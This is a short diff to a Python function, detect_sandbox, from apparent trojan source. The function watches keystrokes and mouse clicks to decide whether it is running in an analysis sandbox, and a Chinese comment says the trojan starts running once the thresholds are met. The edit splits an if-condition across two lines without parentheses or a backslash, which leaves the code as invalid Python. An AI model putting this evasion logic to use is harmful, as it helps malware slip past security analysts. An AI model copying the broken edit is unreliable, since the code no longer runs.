@@ -93,7 +93,8 @@ def detect_sandbox():
                         if keypress_time - first_double_click <= (max_double_clicks*double_click_threshold):
                             sys.exit(0)
                         #如果一切正常，达到阀值，退出沙盒，开始执行木马
-                        if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
+                        if keystrokes >= max_keystrokes
+                            and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
                             return
 
                         previous_timestamp=keypress_time
